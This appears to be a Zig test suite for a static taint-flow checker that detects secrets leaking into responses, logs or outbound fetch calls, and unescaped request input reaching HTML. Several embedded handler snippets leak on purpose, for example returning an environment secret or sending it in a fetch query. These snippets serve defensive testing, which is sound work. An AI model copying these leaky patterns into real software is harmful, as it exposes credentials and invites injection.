    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("UPSTREAM_KEY");
        \\  fetch("https://api.example.com/v1", { method: "POST", body: "hello", query: { key: secret } });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching egress via an options spread" {
    // Regression: a secret carried into the options object through an object
    // spread (`...{ query: { key: secret } }`) was invisible to the per-field
    // body/query/headers extractors, so it escaped every egress sink and
    // no_secret_leakage was falsely proven. The `body:` early return made it
    // worse by short-circuiting the whole-object fallback.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("UPSTREAM_KEY");
        \\  fetch("https://api.example.com/v1", { body: "hello", ...{ query: { key: secret } } });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker proves no_secret_leakage for a benign module fetch" {
    // Negative control for the fix above: a module fetch carrying no secret
    // must still discharge no_secret_leakage (no false positive).
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  fetch("https://api.example.com", { method: "POST", body: "hello" });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(checker.getProperties().no_secret_leakage);
}

test "FlowChecker records validated defended path reaching an HTML response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { escapeHtml } from "zttp:text";
        \\function handler(req) {
        \\  const raw = req.headers.get("x-name");
        \\  const safe = escapeHtml(raw);
        \\  return Response.html(safe);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .injection_safe) {
            found = true;
            try std.testing.expectEqual(SafeForm.validated, d.safe_form);
            try std.testing.expect(d.guard_func != null);
            try std.testing.expectEqualStrings("escapeHtml", d.guard_func.?);
        }
    }
    try std.testing.expect(found);
    try std.testing.expect(checker.getProperties().injection_safe);
}

test "an escaped array sibling cannot discharge injection_safe for raw input" {
    var buf: [512]u8 = undefined;
    const raw =
        \\function handler(req) { return Response.html([req.url].join("")); }
    ;
    const raw_report = try runFlowDiagnostics(std.testing.allocator, raw, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), raw_report.count);
    try std.testing.expect(!raw_report.properties.injection_safe);

    const sibling =
        \\import { escapeHtml } from "zttp:text";
        \\function handler(req) { return Response.html([req.url, escapeHtml(req.url)].join("")); }
    ;
    const sibling_report = try runFlowDiagnostics(std.testing.allocator, sibling, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), sibling_report.count);
    try std.testing.expect(!sibling_report.properties.injection_safe);
}

test "a schema validated array sibling cannot discharge injection_safe for raw input" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  const checked = validateJson("s", req.body);
        \\  return Response.html([req.url, checked.value].join(""));
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.injection_safe);
}

test "value combinations cannot borrow validation from another contributor" {
    const expressions = [_][]const u8{
        "[a, b].join(\"\")",
        "[b, a].join(\"\")",
        "[b, a, b].join(\"\")",
        "[...[b], a].join(\"\")",
        "[...{ values: [a, b] }.values].join(\"\")",
        "({ raw: a, safe: b }).raw",
        "({ safe: b, raw: a }).raw",
        "({ ...{ safe: b }, ...{ raw: a } }).raw",
        "({ ...{ raw: a }, ...{ safe: b } }).raw",
        "[b].concat([a]).join(\"\")",
        "[b, b].join(a)",
        "[a].filter((v) => escapeHtml(v)).join(\"\")",
        "a ?? b",
        "b || a",
        "b ? a : b",
        "match (b) { when \"\": b, default: a }",
        "match (a) { when \"\": a, default: b }",
        "choose(a, b)",
        "dictGet(dictSet(dictSet(dictEmpty(), \"raw\", a), \"safe\", b), \"raw\")",
    };
    for (expressions) |expression| {
        const source = try std.testing.allocator.print(
            \\import {{ escapeHtml }} from "zttp:text";
            \\import {{ dictEmpty, dictSet, dictGet }} from "zttp:collections";
            \\function choose(raw, safe) {{
            \\  if (raw === "") return safe;
            \\  return raw;
            \\}}
            \\function handler(req) {{
            \\  const a = req.url;
            \\  const b = escapeHtml(req.url);
            \\  return Response.html({s});
            \\}}
        , .{expression});
        defer std.testing.allocator.free(source);
        var buf: [512]u8 = undefined;
        const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
        if (report.count != 1 or report.properties.injection_safe) {
            std.debug.print("validation laundering through {s}\n", .{expression});
            return error.ValidationLaundered;
        }
    }
}

test "member writes and array mutations cannot validate raw siblings" {
    const bodies = [_][]const u8{
        "const parts = [a]; parts.push(b); return Response.html(parts.join(\"\"));",
        "const parts = [b]; parts.push(a); return Response.html(parts.join(\"\"));",
        "const parts = []; parts.push(a, b); return Response.html(parts.join(\"\"));",
        "const parts = { raw: a }; parts.safe = b; return Response.html(parts.raw);",
        "const parts = { safe: b }; parts.raw = a; return Response.html(parts.raw);",
    };
    for (bodies) |body| {
        const source = try std.testing.allocator.print(
            \\import {{ escapeHtml }} from "zttp:text";
            \\function handler(req) {{
            \\  const a = req.url;
            \\  const b = escapeHtml(req.url);
            \\  {s}
            \\}}
        , .{body});
        defer std.testing.allocator.free(source);
        var buf: [512]u8 = undefined;
        const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
        try std.testing.expectEqual(@as(usize, 1), report.count);
        try std.testing.expect(!report.properties.injection_safe);
    }
}

test "egress assembly and spread cannot borrow sibling validation" {
    const options = [_][]const u8{
        "{ body: [a, b].join(\"\") }",
        "{ ...{ body: a }, ...{ extra: b } }",
        "{ ...{ extra: b }, ...{ body: a } }",
    };
    for (options) |init| {
        const source = try std.testing.allocator.print(
            \\import {{ escapeHtml }} from "zttp:text";
            \\import {{ fetch }} from "zttp:fetch";
            \\function handler(req) {{
            \\  const a = req.url;
            \\  const b = escapeHtml(a);
            \\  fetch("https://api.example.com", {s});
            \\  return Response.json({{ ok: true }});
            \\}}
        , .{init});
        defer std.testing.allocator.free(source);
        const properties = try runFlowProperties(std.testing.allocator, source);
        try std.testing.expect(!properties.injection_safe);
        try std.testing.expect(!properties.input_validated);
    }
}

test "escaped assembly with static markup still proves injection_safe" {
    const expressions = [_][]const u8{
        "[\"<p>\", b, \"</p>\"].join(\"\")",
        "[b, b].join(\"\")",
        "({ ...{ safe: b }, markup: \"<p>\" }).safe",
        "[b].concat([\"<p>\"]).join(\"\")",
        "[a].map((v) => escapeHtml(v)).join(\"\")",
        "escapeHtml([a, b].join(\"\"))",
        "req.method === \"GET\" ? b : escapeHtml(a)",
        "match (a) { when \"\": b, default: escapeHtml(a) }",
    };
    for (expressions) |expression| {
        const source = try std.testing.allocator.print(
            \\import {{ escapeHtml }} from "zttp:text";
            \\function handler(req) {{
            \\  const a = req.url;
            \\  const b = escapeHtml(a);
            \\  return Response.html({s});
            \\}}
        , .{expression});
        defer std.testing.allocator.free(source);
        var buf: [512]u8 = undefined;
        const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
        try std.testing.expectEqual(@as(usize, 0), report.count);
        try std.testing.expect(report.properties.injection_safe);
    }
}

test "literal match arms preserve escaped content validation" {
    const expressions = [_][]const u8{
        "match (req.url) { when \"\": \"\", default: escapeHtml(req.url) }",
        "match (req.url) { when \"\": escapeHtml(req.url), default: \"\" }",
        "match (req.url) { when \"\": \"\", when \"/\": escapeHtml(req.url), default: \"static\" }",
    };
    for (expressions) |expression| {
        const source = try std.testing.allocator.print(
            \\import {{ escapeHtml }} from "zttp:text";
            \\function handler(req) {{ return Response.html({s}); }}
        , .{expression});
        defer std.testing.allocator.free(source);
        var buf: [512]u8 = undefined;
        const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
        try std.testing.expectEqual(@as(usize, 0), report.count);
        try std.testing.expect(report.properties.injection_safe);
    }
}

test "selection predicates and bounds contribute their own defenses" {
    const cases = [_]struct { expression: []const u8, safe: bool }{
        .{ .expression = "[escapeHtml(req.url)].filter((v) => req.url !== \"\").join(\"\")", .safe = false },
        .{ .expression = "[escapeHtml(req.url)].find((v) => req.url !== \"\") ?? \"\"", .safe = false },
        .{ .expression = "[escapeHtml(req.url)].toSorted((a, b) => req.url.length).join(\"\")", .safe = false },
        .{ .expression = "[escapeHtml(req.url)].slice(req.url.length).join(\"\")", .safe = false },
        .{ .expression = "[req.url].filter((v) => escapeHtml(v) !== \"\").join(\"\")", .safe = false },
        .{ .expression = "[req.url].find((v) => escapeHtml(v) !== \"\") ?? \"\"", .safe = false },
        .{ .expression = "[req.url].toSorted((a, b) => escapeHtml(a).length).join(\"\")", .safe = false },
        .{ .expression = "[req.url].slice(escapeHtml(req.url).length).join(\"\")", .safe = false },
        .{ .expression = "[escapeHtml(req.url)].filter((v) => true).join(\"\")", .safe = true },
        .{ .expression = "[escapeHtml(req.url)].find((v) => true) ?? \"\"", .safe = true },
        .{ .expression = "[escapeHtml(req.url)].toSorted((a, b) => 0).join(\"\")", .safe = true },
        .{ .expression = "[escapeHtml(req.url)].slice(0).join(\"\")", .safe = true },
    };
    for (cases) |case| {
        const source = try std.testing.allocator.print(
            \\import {{ escapeHtml }} from "zttp:text";
            \\function handler(req) {{ return Response.html({s}); }}
        , .{case.expression});
        defer std.testing.allocator.free(source);
        var buf: [512]u8 = undefined;
        const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
        try std.testing.expectEqual(case.safe, report.properties.injection_safe);
        try std.testing.expectEqual(@as(usize, if (case.safe) 0 else 1), report.count);
    }
}

test "selection callbacks carry writes into selected elements" {
    const cases = [_]struct { setup: []const u8 = "", callback: []const u8, safe: bool }{
        .{ .callback = "(v) => { parts[1] = req.url; return req.url !== \"\"; }", .safe = false },
        .{ .callback = "(v) => { parts[1] = req.url; return true; }", .safe = false },
        .{ .setup = "const alias = parts;", .callback = "(v) => { alias[1] = req.url; return true; }", .safe = false },
        .{ .setup = "const holder = { items: parts };", .callback = "(v) => { holder.items[1] = req.url; return true; }", .safe = false },
        .{ .setup = "const holder = [parts];", .callback = "(v) => { holder[0].splice(1, 0, req.url); return true; }", .safe = false },
        .{ .callback = "(v, i, all) => { all[1] = req.url; return true; }", .safe = false },
        .{ .setup = "function replace(xs) { xs[1] = req.url; }", .callback = "(v) => { replace(parts); return true; }", .safe = false },
        .{ .callback = "(v) => { parts.splice(1, 0, req.url); return true; }", .safe = false },
        .{ .callback = "(v) => { [\"x\"].filter((x) => { parts[1] = req.url; return true; }); return true; }", .safe = false },
        .{ .callback = "(v) => { parts[1] = escapeHtml(req.url); return req.url !== \"\"; }", .safe = false },
        .{ .setup = "const other = {};", .callback = "(v) => { other.raw = req.url; return req.url !== \"\"; }", .safe = false },
        .{ .callback = "(v) => { parts[1] = escapeHtml(req.url); return true; }", .safe = true },
        .{ .setup = "const other = {};", .callback = "(v) => { other.raw = req.url; return true; }", .safe = true },
    };
    for (cases) |case| {
        const source = try std.testing.allocator.print(
            \\import {{ escapeHtml }} from "zttp:text";
            \\function handler(req) {{
            \\  const parts = [escapeHtml(req.url), escapeHtml(req.url)];
            \\  {s}
            \\  const out = parts.filter({s}).join("");
            \\  return Response.html(out);
            \\}}
        , .{ case.setup, case.callback });
        defer std.testing.allocator.free(source);
        var buf: [512]u8 = undefined;
        const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
        if (report.properties.injection_safe != case.safe) {
            std.debug.print("selection write verdict for {s}\n", .{case.callback});
            return error.WrongSelectionWriteVerdict;
        }
        try std.testing.expectEqual(@as(usize, if (case.safe) 0 else 1), report.count);
    }
}

test "map callbacks see values written into later elements" {
    const cases = [_]struct { callback: []const u8, safe: bool }{
        .{ .callback = "(v) => { parts[1] = req.url; return v; }", .safe = false },
        .{ .callback = "(v, i, all) => { all[1] = req.url; return v; }", .safe = false },
        .{ .callback = "(v) => { parts[1] = req.url; return escapeHtml(v); }", .safe = true },
        .{ .callback = "(v) => { parts[1] = req.url; return \"static\"; }", .safe = true },
    };
    for (cases) |case| {
        const source = try std.testing.allocator.print(
            \\import {{ escapeHtml }} from "zttp:text";
            \\function handler(req) {{
            \\  const parts = [escapeHtml(req.url), escapeHtml(req.url)];
            \\  const out = parts.map({s}).join("");
            \\  return Response.html(out);
            \\}}
        , .{case.callback});
        defer std.testing.allocator.free(source);
        var buf: [512]u8 = undefined;
        const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
        try std.testing.expectEqual(case.safe, report.properties.injection_safe);
    }
}

test "later iteration writes reach callback sinks even when its result is discarded" {
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const parts = ["a", "b"];
        \\  parts.filter((v) => { parts[1] = secret; console.log(v); return true; });
        \\  return Response.json({ ok: true });
        \\}
    ;
    var buf: [512]u8 = undefined;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_secret_leakage);
}

test "FlowChecker names the guard of a validated value under a unary operator" {
    // The guard search reads a unary operand from the operand field. It read
    // the operator word instead, so a validated value under `!` or `-` named
    // no guard and the defended path was dropped.
    const allocator = std.testing.allocator;
    const sources = [_][]const u8{
        \\import { escapeHtml } from "zttp:text";
        \\function handler(req) {
        \\  const raw = req.headers.get("x-name");
        \\  const safe = escapeHtml(raw);
        \\  return Response.html(!safe);
        \\}
        ,
        \\import { escapeHtml } from "zttp:text";
        \\function handler(req) {
        \\  const raw = req.headers.get("x-name");
        \\  const safe = escapeHtml(raw);
        \\  return Response.html(-safe);
        \\}
        ,
    };
    for (sources) |source| {
        var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
        var atoms = atom_table.AtomTable.init(allocator);
        defer atoms.deinit();
        parser.setAtomTable(&atoms);
        defer parser.deinit();
        const root = try parser.parse();
        const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
        const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
            return error.HandlerNotFound;

        var checker = FlowChecker.init(allocator, ir_view, &atoms);
        checker.scopes = &parser.scopes;
        defer checker.deinit();
        _ = try checker.check(handler_fn);

        var found = false;
        for (checker.getDefendedPaths()) |d| {
            if (d.property != .injection_safe) continue;
            found = true;
            try std.testing.expectEqual(SafeForm.validated, d.safe_form);
            try std.testing.expectEqualStrings("escapeHtml", d.guard_func orelse "");
        }
        try std.testing.expect(found);
        try std.testing.expect(checker.getProperties().injection_safe);
    }
}

test "FlowChecker records never_reached defended path for unused secret" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const k = env("SECRET_KEY");
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .no_secret_leakage) {
            found = true;
            try std.testing.expectEqual(SafeForm.never_reached, d.safe_form);
            try std.testing.expect(d.guard_func == null);
        }
    }
    try std.testing.expect(found);
}

test "FlowChecker records no defended path for a leaking secret" {
    // A handler that actually leaks must not also claim a defended path for
    // the same property: violation and defended are mutually exclusive.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const k = env("SECRET_KEY");
        \\  return Response.json({ leaked: k });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
    for (checker.getDefendedPaths()) |d| {
        try std.testing.expect(d.property != .no_secret_leakage);
    }
}

test "LabelSet operations in flow context" {
    // Verify secret + credential merge
    const secret = LabelSet{ .secret = true };
    const cred = LabelSet{ .credential = true };
    const merged = LabelSet.merge(secret, cred);
    try std.testing.expect(merged.has(.secret));
    try std.testing.expect(merged.has(.credential));
    try std.testing.expect(!merged.has(.user_input));
}

test "environment names refine secret provenance" {
    const cases = [_]struct { name: []const u8, secret: bool }{
        .{ .name = "DB_PASSWORD", .secret = true },
        .{ .name = "API_KEY", .secret = true },
        .{ .name = "JWT_SECRET", .secret = true },
        .{ .name = "ACCESS_TOKEN", .secret = true },
        .{ .name = "PRIVATE_KEY", .secret = true },
        .{ .name = "db_password", .secret = true },
        .{ .name = "Auth_Header", .secret = true },
        .{ .name = "APP_NAME", .secret = false },
        .{ .name = "PORT", .secret = false },
        .{ .name = "NODE_ENV", .secret = false },
        .{ .name = "LOG_LEVEL", .secret = false },
        .{ .name = "DATABASE_URL", .secret = false },
    };
    for (cases) |case| {
        const source = try std.testing.allocator.print(
            \\import {{ env }} from "zttp:env";
            \\function handler(req) {{ return Response.text(env("{s}")); }}
        , .{case.name});
        defer std.testing.allocator.free(source);
        const properties = try runFlowProperties(std.testing.allocator, source);
        try std.testing.expectEqual(!case.secret, properties.no_secret_leakage);
    }
}

test "FlowProperties defaults to all proven" {
    const props = FlowProperties{};
    try std.testing.expect(props.no_secret_leakage);
    try std.testing.expect(props.no_credential_leakage);
    try std.testing.expect(props.input_validated);
    try std.testing.expect(props.pii_contained);
}

test "propertyTagForKind: every DiagnosticKind maps to the expected PropertyTag" {
    // Lock the current mapping. If a future change re-routes a flow-sink
    // category to a different property bucket, this assertion forces a
    // conscious update — without it, a silent mis-routing would weaken
    // the proven-property set in ways the existing flow tests would not
    // catch.
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_response),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_log),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_egress_url),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_egress_body),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_response),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_log),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_egress_url),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_egress_body),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .injection_safe),
        propertyTagForKind(.unvalidated_input_in_egress),
    );
}

test "propertyTagForKind: every DiagnosticKind variant maps to a non-null PropertyTag" {
    // Exhaustiveness lock. The per-variant assertions above pin the
    // current mapping; this test pins the more important invariant that
    // EVERY variant maps to something. Without it, a future maintainer
    // adding a new DiagnosticKind can satisfy Zig's switch exhaustiveness
    // with `else => null,` — both the compiler and the per-variant test
    // stay green while the new variant silently disappears from the
    // proven-property surface (callers like proof_trace and
    // pi_repair_plan all use `orelse continue`).
    inline for (@typeInfo(DiagnosticKind).@"enum".field_names) |field| {
        const kind: DiagnosticKind = @fromBackingInt(@intCast(@backingInt(@field(DiagnosticKind, field))));
        const tag = propertyTagForKind(kind);
        std.testing.expect(tag != null) catch |err| {
            std.log.err(
                "DiagnosticKind.{s} has no PropertyTag mapping; add an arm to propertyTagForKind",
                .{field},
            );
            return err;
        };
    }
}

test "a real secret leak offers no repair intent" {
    // The end-to-end half of the invariant below: a ZTS400 produced by the
    // actual checker on actual source, not a struct built in a test.
    //
    // This test previously asserted the opposite. The reasoning it carried -
    // "the agent inserts a redact/mask/strip call ahead of the offending sink"
    // - describes an edit `insert_guard_before_line` does not make: the
    // primitive inserts a conditional, and no conditional removes a taint
    // label. The claim went unchallenged while nothing consumed the intent.
    // Once diagnostics began carrying it to the model, a recorded case burned
    // its whole attempt budget trying to build the guard this promised.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ leaked: secret });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw_secret_leak: bool = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) {
            saw_secret_leak = true;
            try std.testing.expectEqual(@as(?RepairIntent, null), d.repair_intent);
        }
    }
    try std.testing.expect(saw_secret_leak);
}

test "FlowChecker flags secret returned through a variable-held response" {
    // The sink check must resolve `return res` back to the Response call that
    // produced it; a binding hop must not skip the response-sink analysis.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const res = Response.json({ leaked: secret });
        \\  return res;
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags unvalidated input in a variable-held Response.html" {
    const allocator = std.testing.allocator;
    const source =
        \\function handler(req) {
        \\  const page = Response.html(req.query.q);
        \\  return page;
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .unvalidated_input_in_egress) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().injection_safe);
}

test "FlowChecker flags secret returned through a ternary response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return req.query.debug ? Response.json({ leaked: secret }) : Response.json({ ok: true });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker keeps taint through a user-defined wrapper call" {
    // A helper that returns its argument must not strip labels; dropping them
    // here launders any taint through a one-line wrapper.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function wrap(v) { return v; }
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ leaked: wrap(secret) });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker keeps validated label through a wrapper returning a validator result" {
    // The callee summary must carry the callee's actual return labels: a
    // wrapper around escapeHtml yields .validated, not the argument union,
    // so no false XSS warning fires.
    const allocator = std.testing.allocator;
    const source =
        \\import { escapeHtml } from "zttp:text";
        \\function clean(v) { return escapeHtml(v); }
        \\function handler(req) {
        \\  return Response.html(clean(req.query.q));
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    for (checker.getDiagnostics()) |d| {
        try std.testing.expect(d.kind != .unvalidated_input_in_egress);
    }
    try std.testing.expect(checker.getProperties().injection_safe);
}

/// Retain both parsed modules and their capture tables, then evaluate the
/// imported call against those exact snapshots without filesystem access.
fn runWithImportedFunction(
    allocator: std.mem.Allocator,
    source: []const u8,
    imported_source: []const u8,
    name: []const u8,
) !bool {
    var imported_atoms = atom_table.AtomTable.init(allocator);
    defer imported_atoms.deinit();
    var imported_parser = try @import("zts-engine").parser.JsParser.initAdmission(allocator, allocator, imported_source, .compile);
    defer imported_parser.deinit();
